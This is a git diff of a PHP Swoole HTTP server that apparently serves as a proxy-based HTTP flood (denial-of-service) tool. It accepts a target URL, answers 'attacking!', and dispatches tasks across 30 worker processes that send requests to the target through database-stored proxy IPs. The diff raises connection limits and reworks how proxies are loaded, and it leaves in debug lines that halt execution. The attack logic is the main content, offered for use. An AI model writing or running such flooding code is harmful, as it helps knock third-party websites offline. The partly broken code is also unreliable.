@@ -5,23 +5,41 @@ class HttpServer extends app{
     private $serv;
     private $requset;
     private $response;
+    private $ips;
 
     private $max_page = 100000;
 
     public function __construct(){
         parent::__construct();
 
+        $that = $this;
+
         $this->serv = new swoole_http_server('_', 9502);
         $this->serv->set(array(
             'worker_num' => 8, //一般设置为服务器CPU数的1-4倍
             // 'daemonize' => 1, //以守护进程执行
-            'max_conn'  => 1280,
+            'max_conn'  => 2480,
             'max_request' => 10000,
             'dispatch_mode' => 2,
             'task_worker_num' => 30, //task进程的数量
             'task_ipc_mode ' => 3, //使用消息队列通信，并设置为争抢模式
         ));
         
+        $this->serv->on('Start' , function() use (&$that){
+            $ips = $that->lib('credis')->get('ips');
+            if(is_string($ips) && !empty($ips)){
+                $ips = json_decode($ips , true);
+            }else{
+                $ips = $that->lib('db')->query('select proxy_ip,proxy_port from ###_ips where is_enable = 1');
+                if(!is_array($ips) || empty($ips)){
+                    echo 'no ip'."\n";
+                    die;
+                }
+                $that->lib('credis')->set('ips' , json_encode($ips));
+            }
+            var_dump($data);die;
+        });
+
         $this->serv->on('Request', array($this, 'onRequest'));
         $this->serv->on('Task', array($this, 'onTask'));
         $this->serv->on('Finish', array($this, 'onFinish'));
@@ -41,49 +59,19 @@ class HttpServer extends app{
             $this->end('invalid url');
             return false;
         }
-        //检查是否任务重复
-        $cur_task = $this->lib('credis')->get('attack_task');
-        if($cur_task == $args['url']){
-            $this->end('do not repeat');
-            return false;
-        }
-        //记录当前任务
-        $this->lib('credis')->set('attack_task' , $args['url']);
+        var_dump($this->ips);die;
         //开始处理
         $this->end('attacking!');
-        //获取ips
-        $ips = $this->lib('db')->query('select proxy_ip,proxy_port from ###_ips where is_enable = 1');
-        if(!is_array($ips) || empty($ips)){
-            echo 'no ip'."\n";
-            return false;
-        }
         $that = $this;
         //开始处理
-        do{
-            $k = mt_rand(0 , count($ips) - 1);
+        foreach ($this->ips as $row) {
             //执行任务
             $this->serv->task([
-                'ip'=>$ips[$k]['proxy_ip'],//代理IP
-                'port'=>$ips[$k]['proxy_port'],//代理端口
+                'ip'=>$row['proxy_ip'],//代理IP
+                'port'=>$row['proxy_port'],//代理端口
                 'url'=>$args['url'],
-            ],mt_rand(0,29),function() use ($that , $args){
-                $that->lib('db')->update('kv','value=value-1',['key'=>'num']);
-            });
-            $this->lib('db')->update('kv','value=value+1',['key'=>'num']);
-            $cur = $this->lib('db')->get("select value from ###_kv where `key`='num'");
-            @$cur = intval($cur['value']);
-            //循环条件
-            if(is_numeric($this->max_page) && $this->max_page > 0){
-                while($cur >= $this->max_page){
-                    $cur = $this->lib('db')->get("select value from ###_kv where `key`='num'");
-                    @$cur = intval($cur['value']);
-                    usleep(10000);
-                }
-            }
-        }while(true);
-        //记录当前任务
-        $this->lib('credis')->delete('attack_task');
-        echo "done\n";
+            ],mt_rand(0,29));
+        }
         return true;
         
     }
@@ -142,6 +130,7 @@ class HttpServer extends app{
         if($httpCode != '200'){
             return false;
         }
+        echo $httpCode."\n";
         curl_close($ch);
         return $ret;
     }
@@ -152,5 +141,4 @@ class HttpServer extends app{
     }
 }
 
-//Http服务器-webhook
 new HttpServer();
